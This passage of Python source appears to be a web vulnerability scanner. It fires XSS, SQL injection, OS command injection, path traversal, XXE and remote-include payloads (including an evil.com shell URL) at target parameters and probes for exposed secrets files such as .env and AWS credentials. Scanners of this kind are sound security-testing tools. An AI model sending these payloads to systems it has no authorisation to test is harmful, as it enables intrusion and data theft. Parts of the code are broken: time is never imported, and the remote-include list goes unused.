import subprocess
import requests
import json
import re
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class VulnerabilityScanner:
    """
    Enhanced comprehensive vulnerability scanning with real detection
    """
    
    def __init__(self, database, broadcaster):
        self.db = database
        self.broadcaster = broadcaster
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def comprehensive_scan(self, scan_id, recon_data):
        """
        Run comprehensive vulnerability scans with enhanced detection
        """
        all_vulnerabilities = []
        target = recon_data['target']
        live_hosts = recon_data.get('live_hosts', [])
        endpoints = recon_data.get('endpoints', [])
        
        # Passive Analysis prior to active probes
        self.broadcaster.broadcast_tool_started(scan_id, 'Passive Analysis', target)
        passive_vulns = self._passive_checks(scan_id, recon_data)
        all_vulnerabilities.extend(passive_vulns)
        self.broadcaster.broadcast_tool_completed(scan_id, 'Passive Analysis', 'success', len(passive_vulns))

        # XSS Scanning - ENHANCED
        self.broadcaster.broadcast_tool_started(scan_id, 'XSS Scanner', target)
        xss_vulns = self._scan_xss_advanced(scan_id, target, endpoints)
        all_vulnerabilities.extend(xss_vulns)
        self.broadcaster.broadcast_tool_completed(scan_id, 'XSS Scanner', 'success', len(xss_vulns))
        
        # SQL Injection - ENHANCED
        self.broadcaster.broadcast_tool_started(scan_id, 'SQL Injection Scanner', target)
        sqli_vulns = self._scan_sqli_advanced(scan_id, target, endpoints)
        all_vulnerabilities.extend(sqli_vulns)
        self.broadcaster.broadcast_tool_completed(scan_id, 'SQL Injection Scanner', 'success', len(sqli_vulns))
        
        # Command Injection - NEW
        self.broadcaster.broadcast_tool_started(scan_id, 'Command Injection Scanner', target)
        cmd_vulns = self._scan_command_injection(scan_id, target, endpoints)
        all_vulnerabilities.extend(cmd_vulns)
        self.broadcaster.broadcast_tool_completed(scan_id, 'Command Injection Scanner', 'success', len(cmd_vulns))
        
        # LFI/RFI - NEW
        self.broadcaster.broadcast_tool_started(scan_id, 'File Inclusion Scanner', target)
        fi_vulns = self._scan_file_inclusion(scan_id, target, endpoints)
        all_vulnerabilities.extend(fi_vulns)
        self.broadcaster.broadcast_tool_completed(scan_id, 'File Inclusion Scanner', 'success', len(fi_vulns))
        
        # Directory Traversal - ENHANCED
        self.broadcaster.broadcast_tool_started(scan_id, 'Directory Traversal Scanner', target)
        traversal_vulns = self._scan_directory_traversal_advanced(scan_id, target, endpoints)
        all_vulnerabilities.extend(traversal_vulns)
        self.broadcaster.broadcast_tool_completed(scan_id, 'Directory Traversal Scanner', 'success', len(traversal_vulns))
        
        # Open Redirect - NEW
        self.broadcaster.broadcast_tool_started(scan_id, 'Open Redirect Scanner', target)
        redirect_vulns = self._scan_open_redirect(scan_id, target, endpoints)
        all_vulnerabilities.extend(redirect_vulns)
        self.broadcaster.broadcast_tool_completed(scan_id, 'Open Redirect Scanner', 'success', len(redirect_vulns))
        
        # XXE - NEW
        self.broadcaster.broadcast_tool_started(scan_id, 'XXE Scanner', target)
        xxe_vulns = self._scan_xxe(scan_id, target, endpoints)
        all_vulnerabilities.extend(xxe_vulns)
        self.broadcaster.broadcast_tool_completed(scan_id, 'XXE Scanner', 'success', len(xxe_vulns))
        
        # Security Headers
        self.broadcaster.broadcast_tool_started(scan_id, 'Security Headers Check', target)
        header_issues = self._check_security_headers(scan_id, live_hosts)
        all_vulnerabilities.extend(header_issues)
        self.broadcaster.broadcast_tool_completed(scan_id, 'Security Headers Check', 'success', len(header_issues))
        
        # CORS
        self.broadcaster.broadcast_tool_started(scan_id, 'CORS Scanner', target)
        cors_issues = self._scan_cors(scan_id, live_hosts)
        all_vulnerabilities.extend(cors_issues)
        self.broadcaster.broadcast_tool_completed(scan_id, 'CORS Scanner', 'success', len(cors_issues))
        
        # Sensitive Files - ENHANCED
        self.broadcaster.broadcast_tool_started(scan_id, 'Sensitive File Scanner', target)
        file_exposures = self._scan_sensitive_files_advanced(scan_id, target)
        all_vulnerabilities.extend(file_exposures)
        self.broadcaster.broadcast_tool_completed(scan_id, 'Sensitive File Scanner', 'success', len(file_exposures))
        
        # Backup Files - NEW
        self.broadcaster.broadcast_tool_started(scan_id, 'Backup File Scanner', target)
        backup_files = self._scan_backup_files(scan_id, target)
        all_vulnerabilities.extend(backup_files)
        self.broadcaster.broadcast_tool_completed(scan_id, 'Backup File Scanner', 'success', len(backup_files))
        
        # Information Disclosure - NEW
        self.broadcaster.broadcast_tool_started(scan_id, 'Information Disclosure Scanner', target)
        info_disc = self._scan_information_disclosure(scan_id, target)
        all_vulnerabilities.extend(info_disc)
        self.broadcaster.broadcast_tool_completed(scan_id, 'Information Disclosure Scanner', 'success', len(info_disc))
        
        # Broadcast and store all found vulnerabilities
        for vuln in all_vulnerabilities:
            self.broadcaster.broadcast_vulnerability_found(scan_id, vuln)
            self.db.add_vulnerability(scan_id, vuln)
        
        return all_vulnerabilities

    def _passive_checks(self, scan_id, recon_data):
        """Passive header/cookie/dependency checks without malicious payloads"""
        findings = []
        live_hosts = recon_data.get('live_hosts', [])
        for host in live_hosts[:10]:
            url = host.get('url')
            try:
                resp = self.session.get(url, timeout=8)
                # Cookie security
                cookies = resp.cookies
                for c in cookies:
                    attrs = []
                    if not getattr(c, 'secure', False):
                        attrs.append('Secure')
                    # httpOnly not exposed via requests cookies; infer via Set-Cookie header
                    set_cookies = resp.headers.get('Set-Cookie', '')
                    if c.name in set_cookies and 'httponly' not in set_cookies.lower():
                        attrs.append('HttpOnly')
                    if attrs:
                        findings.append({
                            'type': 'Cookie Security',
                            'severity': 'medium',
                            'title': f"Cookie '{c.name}' missing attributes: {', '.join(attrs)}",
                            'description': 'Cookies should set Secure and HttpOnly flags to reduce risk.',
                            'url': url,
                            'confidence': 80,
                            'tool': 'passive_analyzer',
                            'poc': f"Set-Cookie: {c.name}=...; {resp.headers.get('Set-Cookie','')[:120]}",
                            'remediation': 'Add Secure and HttpOnly to session cookies',
                            'raw_data': {}
                        })

                # Cache-Control on sensitive pages
                cache_control = resp.headers.get('Cache-Control', '')
                page_lower = resp.text.lower()
                sensitive_markers = any(x in page_lower for x in ['login', 'password', 'account', 'profile'])
                if sensitive_markers and ('no-store' not in cache_control.lower() and 'private' not in cache_control.lower()):
                    findings.append({
                        'type': 'Caching Misconfiguration',
                        'severity': 'medium',
                        'title': 'Sensitive page missing no-store/private Cache-Control',
                        'description': 'Sensitive pages should disable caching to prevent data exposure.',
                        'url': url,
                        'confidence': 60,
                        'tool': 'passive_analyzer',
                        'poc': f"Cache-Control: {cache_control}",
                        'remediation': 'Add Cache-Control: no-store, private on sensitive pages',
                        'raw_data': {'cache_control': cache_control}
                    })

                # Autocomplete on sensitive inputs
                import re
                forms = re.findall(r'<form[\s\S]*?>[\s\S]*?</form>', resp.text, re.IGNORECASE)
                for form_html in forms[:20]:
                    # Look for password inputs
                    if re.search(r'<input[^>]*type=["\']password["\']', form_html, re.IGNORECASE):
                        if 'autocomplete="off"' not in form_html.lower():
                            findings.append({
                                'type': 'Autocomplete Risk',
                                'severity': 'low',
                                'title': 'Password form missing autocomplete="off"',
                                'description': 'Disable autocomplete on sensitive credential forms.',
                                'url': url,
                                'confidence': 70,
                                'tool': 'passive_analyzer',
                                'poc': form_html[:200],
                                'remediation': 'Add autocomplete="off" to form or password inputs',
                                'raw_data': {}
                            })

                # JS dependency versions in HTML
                import re
                scripts = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
                for src in scripts[:50]:
                    lower = src.lower()
                    version = None
                    lib = None
                    m = re.search(r'jquery[-.](\d+\.\d+\.\d+)', lower)
                    if m:
                        lib = 'jQuery'
                        version = m.group(1)
                    m = m or re.search(r'angular[-.](\d+\.\d+\.\d+)', lower)
                    if not lib and m:
                        lib = 'AngularJS'
                        version = m.group(1)
                    m2 = re.search(r'bootstrap[-.](\d+\.\d+\.\d+)', lower)
                    if not lib and m2:
                        lib = 'Bootstrap'
                        version = m2.group(1)
                    if lib and version:
                        findings.append({
                            'type': 'Dependency Risk',
                            'severity': 'medium',
                            'title': f"{lib} {version} detected",
                            'description': f"Detected {lib} version {version} which may have known CVEs depending on release date.",
                            'url': url,
                            'confidence': 40,
                            'tool': 'passive_analyzer',
                            'poc': src,
                            'remediation': f"Review {lib} changelog and update to latest stable.",
                            'raw_data': {'library': lib, 'version': version, 'src': src}
                        })
            except Exception:
                continue
        return findings
    
    def _scan_xss_advanced(self, scan_id, target, endpoints):
        """Enhanced XSS scanning with multiple payloads and contexts"""
        vulnerabilities = []
        
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><script>alert(1)</script>',
            '<svg/onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            "'-alert(1)-'",
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src="x" onerror="alert(1)">',
            '"><img src=x onerror=alert(1)//>'
        ]
        
        # Crawl target to find all forms and parameters
        test_endpoints = self._discover_parameters(target, endpoints)
        
        for endpoint_data in test_endpoints:
            endpoint = endpoint_data['url']
            params = endpoint_data.get('params', {})
            
            for param_name in params.keys():
                for payload in xss_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload
                        
                        if endpoint_data.get('method') == 'POST':
                            response = self.session.post(endpoint, data=test_params, timeout=10)
                            method_used = 'POST'
                            req_body = urlencode(test_params)
                            req_url = endpoint
                        else:
                            response = self.session.get(endpoint, params=test_params, timeout=10)
                            method_used = 'GET'
                            req_body = ''
                            req_url = requests.Request('GET', endpoint, params=test_params).prepare().url
                        
                        # Check if payload is reflected without encoding
                        if payload in response.text and response.status_code == 200:
                            # Verify it's in executable context
                            if self._verify_xss_executable(response.text, payload):
                                vuln = {
                                    'type': 'XSS',
                                    'severity': 'high',
                                    'title': f'Reflected XSS in parameter: {param_name}',
                                    'description': f'Parameter "{param_name}" reflects unencoded user input, allowing JavaScript execution',
                                    'url': endpoint,
                                    'confidence': 95,
                                    'tool': 'xss_scanner',
                                    'poc': f'Parameter: {param_name}\nPayload: {payload}\nMethod: {endpoint_data.get("method", "GET")}',
                                    'remediation': 'Implement proper output encoding/escaping for all user input',
                                    'raw_data': {'parameter': param_name, 'payload': payload, 'method': endpoint_data.get('method')}
                                }
                                vulnerabilities.append(vuln)
                                try:
                                    # Log HTTP history
                                    self.db.add_http_request(
                                        scan_id,
                                        method_used,
                                        req_url,
                                        "\n".join([f"{k}: {v}" for k, v in self.session.headers.items()]),
                                        req_body,
                                        response.status_code,
                                        "\n".join([f"{k}: {v}" for k, v in response.headers.items()]),
                                        response.text,
                                        0,
                                        None
                                    )
                                except Exception:
                                    pass
                                break  # Found, no need to test more payloads for this param
                    except Exception as e:
                        continue
        
        return vulnerabilities
    
    def _scan_sqli_advanced(self, scan_id, target, endpoints):
        """Enhanced SQL injection detection with multiple techniques"""
        vulnerabilities = []
        
        sqli_payloads = [
            ("'", "Single quote"),
            ("' OR '1'='1", "Boolean-based blind"),
            ("' OR '1'='1' --", "Comment injection"),
            ("' OR '1'='1' #", "Hash comment"),
            ("1' OR '1'='1", "Numeric injection"),
            ("admin'--", "Auth bypass"),
            ("' UNION SELECT NULL--", "Union-based"),
            ("' AND 1=2 UNION SELECT NULL--", "Union with false condition"),
            ("1' AND '1'='1", "AND injection"),
            ("1' AND '1'='2", "Blind SQLi test"),
        ]
        
        error_patterns = [
            r"SQL syntax.*?error",
            r"mysql_fetch",
            r"mysql_num_rows",
            r"mysqli",
            r"ORA-\d{5}",
            r"PostgreSQL.*?ERROR",
            r"SQLSTATE\[\w+\]",
            r"Unclosed quotation mark",
            r"quoted string not properly terminated",
            r"Microsoft SQL Native Client error"
        ]
        
        # Discover all parameters
        test_endpoints = self._discover_parameters(target, endpoints)
        
        for endpoint_data in test_endpoints:
            endpoint = endpoint_data['url']
            params = endpoint_data.get('params', {})
            
            for param_name in params.keys():
                # First, get baseline response
                try:
                    baseline = self.session.get(endpoint, params=params, timeout=10)
                    baseline_length = len(baseline.text)
                except:
                    continue
                
                for payload, technique in sqli_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload
                        
                        if endpoint_data.get('method') == 'POST':
                            response = self.session.post(endpoint, data=test_params, timeout=10)
                            method_used = 'POST'
                            req_body = urlencode(test_params)
                            req_url = endpoint
                        else:
                            response = self.session.get(endpoint, params=test_params, timeout=10)
                            method_used = 'GET'
                            req_body = ''
                            req_url = requests.Request('GET', endpoint, params=test_params).prepare().url
                        
                        # Check for SQL errors
                        for pattern in error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                vuln = {
                                    'type': 'SQL Injection',
                                    'severity': 'critical',
                                    'title': f'SQL Injection in parameter: {param_name}',
                                    'description': f'SQL error detected when injecting {technique} payload in "{param_name}"',
                                    'url': endpoint,
                                    'confidence': 95,
                                    'tool': 'sqli_scanner',
                                    'poc': f'Parameter: {param_name}\nPayload: {payload}\nTechnique: {technique}\nError: {pattern}',
                                    'remediation': 'Use parameterized queries/prepared statements',
                                    'raw_data': {'parameter': param_name, 'payload': payload, 'technique': technique}
                                }
                                vulnerabilities.append(vuln)
                                try:
                                    self.db.add_http_request(
                                        scan_id,
                                        method_used,
                                        req_url,
                                        "\n".join([f"{k}: {v}" for k, v in self.session.headers.items()]),
                                        req_body,
                                        response.status_code,
                                        "\n".join([f"{k}: {v}" for k, v in response.headers.items()]),
                                        response.text,
                                        0,
                                        None
                                    )
                                except Exception:
                                    pass
                                break
                        
                        # Check for boolean-based blind SQLi
                        if "'1'='1" in payload and response.status_code == 200:
                            if abs(len(response.text) - baseline_length) > 100:  # Significant difference
                                vuln = {
                                    'type': 'SQL Injection',
                                    'severity': 'critical',
                                    'title': f'Blind SQL Injection in parameter: {param_name}',
                                    'description': f'Boolean-based blind SQL injection detected in "{param_name}"',
                                    'url': endpoint,
                                    'confidence': 85,
                                    'tool': 'sqli_scanner',
                                    'poc': f'Parameter: {param_name}\nPayload: {payload}\nResponse length changed significantly',
                                    'remediation': 'Use parameterized queries/prepared statements',
                                    'raw_data': {'parameter': param_name, 'payload': payload}
                                }
                                vulnerabilities.append(vuln)
                                try:
                                    self.db.add_http_request(
                                        scan_id,
                                        method_used,
                                        req_url,
                                        "\n".join([f"{k}: {v}" for k, v in self.session.headers.items()]),
                                        req_body,
                                        response.status_code,
                                        "\n".join([f"{k}: {v}" for k, v in response.headers.items()]),
                                        response.text,
                                        0,
                                        None
                                    )
                                except Exception:
                                    pass
                    except:
                        continue
        
        return vulnerabilities
    
    def _scan_command_injection(self, scan_id, target, endpoints):
        """Scan for OS command injection"""
        vulnerabilities = []
        
        cmd_payloads = [
            ('; whoami', 'Semicolon separator'),
            ('| whoami', 'Pipe operator'),
            ('`whoami`', 'Backtick execution'),
            ('$(whoami)', 'Command substitution'),
            ('& whoami &', 'Background execution'),
            ('; sleep 5', 'Time-based detection'),
        ]
        
        indicators = ['uid=', 'root', 'www-data', 'apache', 'nginx']
        
        test_endpoints = self._discover_parameters(target, endpoints)
        
        for endpoint_data in test_endpoints:
            endpoint = endpoint_data['url']
            params = endpoint_data.get('params', {})
            
            for param_name in params.keys():
                for payload, technique in cmd_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload
                        
                        start_time = time.time()
                        response = self.session.get(endpoint, params=test_params, timeout=15)
                        elapsed = time.time() - start_time
                        
                        # Check for command output
                        if any(indicator in response.text for indicator in indicators):
                            vulnerabilities.append({
                                'type': 'Command Injection',
                                'severity': 'critical',
                                'title': f'OS Command Injection in parameter: {param_name}',
                                'description': f'Command injection detected using {technique}',
                                'url': endpoint,
                                'confidence': 95,
                                'tool': 'cmd_injection_scanner',
                                'poc': f'Parameter: {param_name}\nPayload: {payload}',
                                'remediation': 'Never pass user input directly to system commands. Use safe APIs',
                                'raw_data': {'parameter': param_name, 'payload': payload}
                            })
                            break
                        
                        # Time-based detection
                        if 'sleep' in payload and elapsed >= 5:
                            vulnerabilities.append({
                                'type': 'Command Injection',
                                'severity': 'critical',
                                'title': f'Blind Command Injection in parameter: {param_name}',
                                'description': f'Time-based command injection detected',
                                'url': endpoint,
                                'confidence': 80,
                                'tool': 'cmd_injection_scanner',
                                'poc': f'Parameter: {param_name}\nPayload: {payload}\nDelay: {elapsed:.2f}s',
                                'remediation': 'Never pass user input directly to system commands',
                                'raw_data': {'parameter': param_name, 'payload': payload}
                            })
                    except:
                        continue
        
        return vulnerabilities
    
    def _scan_file_inclusion(self, scan_id, target, endpoints):
        """Scan for LFI/RFI vulnerabilities"""
        vulnerabilities = []
        
        lfi_payloads = [
            '../../../etc/passwd',
            '../../../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '/etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..%252F..%252F..%252Fetc%252Fpasswd',
        ]
        
        rfi_payloads = [
            'http://evil.com/shell.txt',
            '//evil.com/shell.txt',
        ]
        
        lfi_indicators = ['root:', 'daemon:', '/bin/bash', '/bin/sh']
        
        test_endpoints = self._discover_parameters(target, endpoints)
        
        for endpoint_data in test_endpoints:
            endpoint = endpoint_data['url']
            params = endpoint_data.get('params', {})
            
            # Look for file/page/include parameters
            file_params = [p for p in params.keys() if any(keyword in p.lower() 
                          for keyword in ['file', 'page', 'include', 'path', 'doc', 'document'])]
            
            if not file_params:
                file_params = list(params.keys())[:3]  # Test first 3 params
            
            for param_name in file_params:
                # Test LFI
                for payload in lfi_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload
                        
                        response = self.session.get(endpoint, params=test_params, timeout=10)
                        
                        if any(indicator in response.text for indicator in lfi_indicators):
                            vulnerabilities.append({
                                'type': 'Local File Inclusion',
                                'severity': 'critical',
                                'title': f'LFI in parameter: {param_name}',
                                'description': f'Local file inclusion allows reading arbitrary files on the server',
                                'url': endpoint,
                                'confidence': 95,
                                'tool': 'lfi_scanner',
                                'poc': f'Parameter: {param_name}\nPayload: {payload}',
                                'remediation': 'Use whitelisting for file includes, never allow user input in file paths',
                                'raw_data': {'parameter': param_name, 'payload': payload}
                            })
                            break
                    except:
                        continue
        
        return vulnerabilities
    
    def _scan_directory_traversal_advanced(self, scan_id, target, endpoints):
        """Enhanced directory traversal detection"""
        vulnerabilities = []
        
        traversal_payloads = [
            ('../../../etc/passwd', 'Unix password file'),
            ('..\\..\\..\\windows\\win.ini', 'Windows config'),
            ('../../../etc/shadow', 'Unix shadow file'),
            ('..\\..\\..\\ windows\\system32\\drivers\\etc\\hosts', 'Windows hosts'),
            ('....//....//....//etc/passwd', 'Double encoding'),
            ('%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'URL encoding'),
        ]
        
        indicators = {
            'passwd': ['root:', 'daemon:'],
            'win.ini': ['[boot loader]', '[fonts]'],
            'hosts': ['127.0.0.1', 'localhost']
        }
        
        test_endpoints = self._discover_parameters(target, endpoints)
        
        for endpoint_data in test_endpoints:
            endpoint = endpoint_data['url']
            params = endpoint_data.get('params', {})
            
            for param_name in params.keys():
                for payload, desc in traversal_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload
                        
                        response = self.session.get(endpoint, params=test_params, timeout=10)
                        
                        # Check for file content indicators
                        for file_type, file_indicators in indicators.items():
                            if any(indicator in response.text for indicator in file_indicators):
                                vulnerabilities.append({
                                    'type': 'Directory Traversal',
                                    'severity': 'high',
                                    'title': f'Directory Traversal in parameter: {param_name}',
                                    'description': f'Directory traversal allows accessing {desc}',
                                    'url': endpoint,
                                    'confidence': 95,
                                    'tool': 'traversal_scanner',
                                    'poc': f'Parameter: {param_name}\nPayload: {payload}',
                                    'remediation': 'Sanitize file paths, use whitelisting',
                                    'raw_data': {'parameter': param_name, 'payload': payload}
                                })
                                break
                    except:
                        continue
        
        return vulnerabilities
    
    def _scan_open_redirect(self, scan_id, target, endpoints):
        """Scan for open redirect vulnerabilities"""
        vulnerabilities = []
        
        redirect_payloads = [
            'https://evil.com',
            '//evil.com',
            '/\\evil.com',
            'https:///evil.com',
        ]
        
        test_endpoints = self._discover_parameters(target, endpoints)
        
        for endpoint_data in test_endpoints:
            endpoint = endpoint_data['url']
            params = endpoint_data.get('params', {})
            
            redirect_params = [p for p in params.keys() if any(keyword in p.lower() 
                              for keyword in ['url', 'redirect', 'return', 'next', 'goto', 'target'])]
            
            for param_name in redirect_params:
                for payload in redirect_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload
                        
                        response = self.session.get(endpoint, params=test_params, timeout=10, allow_redirects=False)
                        
                        if response.status_code in [301, 302, 303, 307, 308]:
                            location = response.headers.get('Location', '')
                            if 'evil.com' in location:
                                vulnerabilities.append({
                                    'type': 'Open Redirect',
                                    'severity': 'medium',
                                    'title': f'Open Redirect in parameter: {param_name}',
                                    'description': f'Application redirects to untrusted URLs',
                                    'url': endpoint,
                                    'confidence': 95,
                                    'tool': 'redirect_scanner',
                                    'poc': f'Parameter: {param_name}\nPayload: {payload}\nRedirects to: {location}',
                                    'remediation': 'Use whitelisting for redirect URLs',
                                    'raw_data': {'parameter': param_name, 'payload': payload}
                                })
                                break
                    except:
                        continue
        
        return vulnerabilities
    
    def _scan_xxe(self, scan_id, target, endpoints):
        """Scan for XXE vulnerabilities"""
        vulnerabilities = []
        
        xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>'''
        
        test_endpoints = self._discover_parameters(target, endpoints)
        
        for endpoint_data in test_endpoints:
            if endpoint_data.get('method') != 'POST':
                continue
            
            endpoint = endpoint_data['url']
            
            try:
                response = self.session.post(
                    endpoint,
                    data=xxe_payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=10
                )
                
                if 'root:' in response.text or '/bin/bash' in response.text:
                    vulnerabilities.append({
                        'type': 'XXE',
                        'severity': 'critical',
                        'title': 'XML External Entity Injection',
                        'description': 'Application is vulnerable to XXE, allowing file read',
                        'url': endpoint,
                        'confidence': 95,
                        'tool': 'xxe_scanner',
                        'poc': 'XXE payload successfully read /etc/passwd',
                        'remediation': 'Disable external entity processing in XML parser',
                        'raw_data': {}
                    })
            except:
                continue
        
        return vulnerabilities
    
    def _scan_sensitive_files_advanced(self, scan_id, target):
        """Enhanced sensitive file detection"""
        issues = []
        
        sensitive_files = [
            ('/.git/config', 'critical', 'Git configuration'),
            ('/.git/HEAD', 'critical', 'Git HEAD file'),
            ('/.env', 'critical', 'Environment variables'),
            ('/config.php', 'high', 'PHP configuration'),
            ('/wp-config.php', 'critical', 'WordPress config'),
            ('/backup.sql', 'critical', 'SQL backup'),
            ('/database.sql', 'critical', 'Database dump'),
            ('/.aws/credentials', 'critical', 'AWS credentials'),
            ('/config.php.bak', 'high', 'Backup file'),
            ('/web.config', 'medium', 'IIS config'),
            ('/.htaccess', 'medium', 'Apache config'),
            ('/phpinfo.php', 'high', 'PHP info page'),
            ('/README.md', 'low', 'Readme file'),
            ('/.DS_Store', 'low', 'Mac metadata'),
            ('/composer.json', 'low', 'PHP dependencies'),
            ('/package.json', 'low', 'Node dependencies'),
        ]
        
        for file_path, severity, description in sensitive_files:
            try:
                test_url = urljoin(target, file_path)
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code == 200 and len(response.content) > 0:
                    # Additional verification
                    content = response.text.lower()
                    verified = False
                    
                    if 'git' in file_path and '[core]' in content:
                        verified = True
                    elif file_path.endswith('.sql') and 'insert' in content:
                        verified = True
                    elif file_path.endswith('.env') and '=' in content:
                        verified = True
                    elif 'phpinfo' in file_path and 'php version' in content:
                        verified = True
                    elif response.status_code == 200:
                        verified = True
                    
                    if verified:
                        issues.append({
                            'type': 'Sensitive File Exposure',
                            'severity': severity,
                            'title': f'Exposed: {description}',
                            'description': f'{description} ({file_path}) is publicly accessible',
                            'url': test_url,
                            'confidence': 100,
                            'tool': 'file_scanner',
                            'poc': f'File accessible at: {test_url}\nSize: {len(response.content)} bytes',
                            'remediation': 'Remove or properly protect sensitive files',
                            'raw_data': {'file_path': file_path, 'size': len(response.content)}
                        })
            except:
                continue
        
        return issues
    
    def _scan_backup_files(self, scan_id, target):
        """Scan for backup files"""
        vulnerabilities = []
        
        # Get base URLs to test
        parsed = urlparse(target)
        base_paths = ['/']
        
        # Common backup extensions
        extensions = ['.bak', '.backup', '.old', '.copy', '.orig', '.tmp', '~', '.swp']
        
        common_files = ['index', 'config', 'database', 'admin', 'login']
        common_exts = ['php', 'asp', 'aspx', 'jsp']
        
        for filename in common_files:
            for ext in common_exts:
                for backup_ext in extensions[:3]:  # Test first 3
                    test_file = f'/{filename}.{ext}{backup_ext}'
                    test_url = urljoin(target, test_file)
                    
                    try:
                        response = self.session.get(test_url, timeout=5)
                        if response.status_code == 200 and len(response.content) > 0:
                            vulnerabilities.append({
                                'type': 'Backup File Exposure',
                                'severity': 'high',
                                'title': f'Exposed Backup File: {test_file}',
                                'description': 'Backup file containing source code is accessible',
                                'url': test_url,
                                'confidence': 95,
                                'tool': 'backup_scanner',
                                'poc': f'File: {test_url}\nSize: {len(response.content)} bytes',
                                'remediation': 'Remove all backup files from web root',
                                'raw_data': {}
                            })
                    except:
                        continue
        
        return vulnerabilities
    
    def _scan_information_disclosure(self, scan_id, target):
        """Scan for information disclosure issues"""
        vulnerabilities = []
        
        try:
            # Test for directory listing
            response = self.session.get(target, timeout=10)
            
            if response.status_code == 200:
                content = response.text.lower()
                
                # Check for directory listing
                if 'index of' in content or '<title>index of /' in content:
                    vulnerabilities.append({
                        'type': 'Information Disclosure',
                        'severity': 'medium',
                        'title': 'Directory Listing Enabled',
                        'description': 'Directory listing exposes file structure',
                        'url': target,
                        'confidence': 100,
                        'tool': 'info_disc_scanner',
                        'poc': 'Directory listing is enabled',
                        'remediation': 'Disable directory listing in web server config',
                        'raw_data': {}
                    })
                
                # Check for error messages
                error_patterns = [
                    (r'Warning:.*? in .*? on line', 'PHP Warning'),
                    (r'Fatal error:.*? in .*? on line', 'PHP Fatal Error'),
                    (r'Stack trace:', 'Stack Trace'),
                    (r'Database error', 'Database Error'),
                ]
                
                for pattern, error_type in error_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        vulnerabilities.append({
                            'type': 'Information Disclosure',
                            'severity': 'medium',
                            'title': f'{error_type} Exposed',
                            'description': f'Application exposes {error_type} with sensitive information',
                            'url': target,
                            'confidence': 95,
                            'tool': 'info_disc_scanner',
                            'poc': f'Error pattern found: {pattern}',
                            'remediation': 'Disable error display in production, use error logging instead',
                            'raw_data': {}
                        })
                        break
        except:
            pass
        
        return vulnerabilities
    
    def _check_security_headers(self, scan_id, live_hosts):
        """Check for missing security headers"""
        issues = []
        
        required_headers = {
            'X-Frame-Options': ('medium', 'Clickjacking protection missing'),
            'X-Content-Type-Options': ('low', 'MIME-sniffing protection missing'),
            'Strict-Transport-Security': ('medium', 'HSTS not implemented'),
            'Content-Security-Policy': ('medium', 'CSP not implemented'),
            'X-XSS-Protection': ('low', 'XSS protection header missing'),
            'Referrer-Policy': ('low', 'Referrer policy not set'),
        }
        
        for host_info in live_hosts[:5]:
            url = host_info.get('url')
            try:
                response = self.session.get(url, timeout=5)
                
                for header, (severity, description) in required_headers.items():
                    if header not in response.headers:
                        issues.append({
                            'type': 'Security Misconfiguration',
                            'severity': severity,
                            'title': f'Missing Security Header: {header}',
                            'description': description,
                            'url': url,
                            'confidence': 100,
                            'tool': 'header_scanner',
                            'poc': f'Header "{header}" not found in response',
                            'remediation': f'Add the {header} header to all responses',
                            'raw_data': {'missing_header': header}
                        })
            except:
                continue
        
        return issues
    
    def _scan_cors(self, scan_id, live_hosts):
        """Scan for CORS misconfigurations"""
        issues = []
        
        for host_info in live_hosts[:5]:
            url = host_info.get('url')
            try:
                response = self.session.get(
                    url,
                    headers={'Origin': 'https://evil.com'},
                    timeout=5
                )
                
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                
                if acao == '*':
                    issues.append({
                        'type': 'CORS Misconfiguration',
                        'severity': 'high',
                        'title': 'Wildcard CORS Configuration',
                        'description': 'CORS allows any origin (*), enabling unauthorized access',
                        'url': url,
                        'confidence': 100,
                        'tool': 'cors_scanner',
                        'poc': f'Access-Control-Allow-Origin: *',
                        'remediation': 'Configure CORS to only allow trusted origins',
                        'raw_data': {'acao_header': acao}
                    })
                elif acao == 'https://evil.com':
                    issues.append({
                        'type': 'CORS Misconfiguration',
                        'severity': 'high',
                        'title': 'CORS Reflects Arbitrary Origins',
                        'description': 'CORS reflects any origin, enabling cross-origin attacks',
                        'url': url,
                        'confidence': 100,
                        'tool': 'cors_scanner',
                        'poc': f'Origin: https://evil.com reflected in ACAO header',
                        'remediation': 'Implement origin whitelist validation',
                        'raw_data': {'acao_header': acao}
                    })
            except:
                continue
        
        return issues
    
    # Helper methods
    
    def _discover_parameters(self, target, endpoints):
        """Discover all parameters from endpoints and forms"""
        discovered = []
        
        # Test target itself
        try:
            response = self.session.get(target, timeout=10)
            
            # Find forms
            forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.DOTALL | re.IGNORECASE)
            for form in forms:
                form_data = self._parse_form(form, target)
                if form_data:
                    discovered.append(form_data)
            
            # Parse URL parameters from links
            links = re.findall(r'href=["\']([^"\']+)["\']', response.text)
            for link in links:
                if '?' in link:
                    full_url = urljoin(target, link)
                    parsed = urlparse(full_url)
                    params = parse_qs(parsed.query)
                    if params:
                        discovered.append({
                            'url': f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                            'params': {k: v[0] if v else '' for k, v in params.items()},
